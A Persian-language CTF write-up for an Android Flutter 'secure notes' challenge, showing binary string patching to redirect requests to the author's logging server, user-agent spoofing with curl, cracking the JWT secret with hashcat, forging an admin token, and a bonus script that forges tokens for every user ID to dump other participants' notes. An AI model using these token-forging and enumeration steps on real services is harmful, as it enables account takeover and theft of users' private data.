---
tags:
  - CyberSpace
  - CyberSpace-2024
  - Reverse
  - Android
  - Flutter
---

اگه چلنج [login](./login.md) رو دیده باشین از ابزار [blutter](https://github.com/worawit/blutter) برای ریورس فلاتر استفاده کردیم

تو این چلنج هم همین کارو میکنیم

این دفعه یکم کارمون سخت تره چون چلنج سخت تری هم هست :joy:

Anyway بریم سراغ چلنج

ایندفعه چندین سورس داریم که نیازه اکثرشون رو چک کنیم

![files](secure-note-1.png)

بعد از بررسی اجمالی سورس ها به یه سری اندپوینت میرسیم

https://securenotesmobile-challs.csc.tf/register

https://securenotesmobile-challs.csc.tf/login

https://securenotesmobile-challs.csc.tf/notes

https://securenotesmobile-challs.csc.tf/create_note

اگه یه درخواست ساده curl به سمتشون ارسال کنیم، میبینیم که باید متد post ارسال کنیم

پس میگردیم دنبال اسم فیلد های هر اندپوینت

![curl](secure-note-2.png)

https://securenotesmobile-challs.csc.tf/register => Content-Type: application/json; charset=UTF-8, username, password

پس میشه همچین دستوری

```bash
curl https://securenotesmobile-challs.csc.tf/register -H "Content-Type: application/json; charset=UTF-8" --data-raw '{"username": "iam", "password": "SafaSafari"}' -i
```

![403](secure-note-3.png)

اما صبر کنید

داره ۴۰۳ میده!!

یعنی فهمیده که خود برنامه درخواست نمیزنه و ما با curl بازسازیش کردیم

خوب ما در اصل چندین پارامتر داریم که میتونه این رو لو بده

یکی از ساده تریناش user-agent هست

پس باید ببینیم برنامه چه user-agent ای ارسال میکنه سمت سرور و ما هم با همون user-agent بفرستیم

یه راهی که تو بقیه رایتاپ ها اومده و من زیاد از پروژش خوشم نمیاد اینه که میان ssl pinning توی فلاتر رو با ابزار [reflutter](https://github.com/ptswarm/reFlutter) حذف میکنن و درخواست رو اسنیف میکنن

اما ما میخوایم به یه روش باحال تر چلنج رو حل کنیم

یه قانون نانوشته تو ریورس باینری هست اونم اینه که شما میتونید بدون تغییر دادن length استرینگ ها، اونا رو تغییر بدین

من یه سایت دارم که همه درخواست هایی که بهش میاد رو ذخیره میکنم تو یه کانال تلگرامی

پس میایم و این اندپوینت رو تغییر میدیم

https://securenotesmobile-challs.csc.tf/register => https://i.safa.re/smobile-challs.csc.tf/register

و باینری رو میزاریم سر جاش و تو موبایل برنامه رو اجرا میکنیم و تو کانال منتظر دریافت درخواست میمونیم

![ip log](secure-note-4.png)

پس یوزر ایجنت باید `Dart/3.3 (dart:io)` باشه

```bash
curl https://securenotesmobile-challs.csc.tf/register -H "Content-Type: application/json; charset=UTF-8" --data-raw '{"username": "iam", "password": "SafaSafari"}' -A "Dart/3.3 (dart:io)"
```

![200](secure-note-5.png)

و بعد لاگین

![login](secure-note-6.png)

حالا چی؟

یه jwt بهمون داده که نمیدونیم کجا لوله کنیم =))))))

اگه قسمت payload رو چک کنیم با همچین چیزی مواجه میشیم

```json
{
    "fresh": false,
    "iat": 1725614233,
    "jti": "4646cba7-c0ee-4f71-980b-fcaa418558ef",
    "type": "access",
    "sub": 261,
    "nbf": 1725614233,
    "csrf": "a9040a64-8d22-49bf-baa3-79d4b1803a3b",
    "exp": 1725615133
}
```

اون پارامتر sub منظورش همون یوزر آیدی هست

حدس میزنم ادمین فلگ رو به عنوان یه نوت ذخیره کرده باشه

اما ما که سکرت jwt رو نداریم

چیکار کنیم؟

کرک =)))

```bash
hashcat -m 16500 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNTEzOTI1MywianRpIjoiZDM5M2ViZTktNTFmMy00YjRiLTk0MGMtMmI0ZTMxYzI2Yzc4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MTE4LCJuYmYiOjE3MjUxMzkyNTMsImNzcmYiOiJjYzE0MDY2MC0zNjVjLTQxNWQtOWZmMC1kYWY1ZGI5ZTEyZTciLCJleHAiOjE3MjUxNDAxNTN9.yrhuzsNCJPcs2OdWd83lrXmaN7Ho0r8z9QHFaK226sI" /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

با استفاده از hashcat و این کامند، هش رو میزنیم رو کرک به امید این که سکرت اش در بیاد

و در میاد =)))))

![hashcat](secure-note-7.png)

پس سکرت jwt امون `789456123` هست

میریم سراغ [سابیرشف](https://gchq.github.io/CyberChef/) دوست داشتنی

![cyberchef](secure-note-8.png)

توکنی که از سایبرشف دریافت کردیم رو میزاریم تو اندپوینتی که مربوط به لود کردن note هاس

```bash
curl https://securenotesmobile-challs.csc.tf/notes -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNTYxNDIzMywianRpIjoiNDY0NmNiYTctYzBlZS00ZjcxLTk4MGItZmNhYTQxODU1OGVmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MSwibmJmIjoxNzI1NjE0MjMzLCJjc3JmIjoiYTkwNDBhNjQtOGQyMi00OWJmLWJhYTMtNzlkNGIxODAzYTNiIiwiZXhwIjoxNzI1NjE1MTMzfQ.bKPJV_aP7EO21vBnIcbmLRGQKvlbY_xNQnHqnwhbGnY" -H "User-Agent: Dart/3.3 (dart:io)"
```

![flag](secure-note-9.png)

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`CSCTF{1_w0nd3r_1f_y0u_f0r607_7h3_u53r_463n7}`</div>
---

bonus

از اونجایی که من خیلی فضولم، یه اسکریپت نوشتم تا نوت های بقیه افراد رو هم ببینم =))))

```python
import jwt
import requests


for i in range(1, 262):
    token = jwt.encode({"fresh":False,"iat":1725614233,"jti":"4646cba7-c0ee-4f71-980b-fcaa418558ef","type":"access","sub":i,"nbf":1725614233,"csrf":"a9040a64-8d22-49bf-baa3-79d4b1803a3b","exp":1825615133}, "789456123")
    print(requests.get("https://securenotesmobile-challs.csc.tf/notes", headers={"User-Agent": "Dart/3.3 (dart:io)", "Authorization": "Bearer {}".format(token)}).json())
```

اگه براتون جالبه، یه بار رانش کردم و نتیجش رو گذاشتم [اینجا](https://pastecode.io/s/7c25azjj)

!!! نویسنده
    [SafaSafari](https://twitter.com/SafaSafari3)